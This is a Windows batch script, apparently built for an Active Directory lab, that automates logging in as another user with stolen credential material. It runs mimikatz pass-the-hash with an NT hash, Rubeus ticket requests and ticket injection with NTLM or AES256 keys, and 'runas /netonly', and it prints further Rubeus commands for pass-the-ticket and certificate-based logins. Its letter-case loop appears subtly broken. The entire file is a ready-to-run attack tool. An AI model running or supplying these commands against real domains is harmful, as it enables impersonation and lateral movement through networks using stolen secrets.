@echo off
cd C:\Tools

set /p domain= "Domain:   "
IF not defined domain goto noexit

for /f "usebackq delims=" %%I in (`powershell "\"%domain%\".toUpper()"`) do set "upper=%%~I"
for %%a in ("a=A" "b=B" "c=C" "d=D" "e=E" "f=F" "g=G" "h=H" "i=I"
        "j=J" "k=K" "l=L" "m=M" "n=N" "o=O" "p=P" "q=Q" "r=R"
        "s=S" "t=T" "u=U" "v=V" "w=W" "x=X" "y=Y" "z=Z" "ä=Ä"
        "ö=Ö" "ü=Ü") do (
  call set %domain%=%%%domain%:%%~a%%
)
ksetup.exe /SetRealmFlags %upper% tcpsupported


set /p user=  "User:     "
IF not defined user goto commonexit


set /p rc4=  "NT hash:  "
:rc4
IF defined rc4 (
  taskkill.exe /F /IM explorer.exe & mimikatz.exe privilege::debug "sekurlsa::pth /domain:%domain% /user:%user% /ntlm:%rc4% /run:"""cmd.exe /c Rubeus.exe asktgt /domain:%domain% /user:%user% /rc4:%rc4% /ptt ^& start C:\Windows\explorer.exe /NoUACCheck"""" exit
  goto commonexit
)

set /p aes256= "AES256:   "
:aes256
IF defined aes256 (
  taskkill.exe /F /IM explorer.exe & Rubeus.exe asktgt /domain:%domain% /user:%user% /aes256:%aes256% /createnetonly:"C:\Windows\explorer.exe /NoUACCheck" /show
  goto commonexit
)

:password
taskkill.exe /F /IM explorer.exe & runas.exe /netonly /user:%domain%\%user% "C:\Windows\explorer.exe /NoUACCheck"

:commonexit
REM exit
goto end

:noexit
echo.
echo TICKET (TGT) as credential material:
echo taskkill.exe /F /IM explorer.exe
echo Rubeus.exe createnetonly /domain:sde.inlanefreight.local /username:DC02$ /password:blah /program:"C:\Windows\explorer.exe /NoUACCheck" /show
echo new-powershell Rubeus.exe ptt /ticket:BASE64_OR_FILEPATH
echo.
echo CERTIFICATE as credential material:
echo taskkill.exe /F /IM explorer.exe
echo Rubeus.exe asktgt /domain:sde.inlanefreight.local /user:Name /certificate:C:\tmp\User1.pfx /password:PFXPass1! /createnetonly:"C:\Windows\explorer.exe /NoUACCheck" /show
echo.

:end
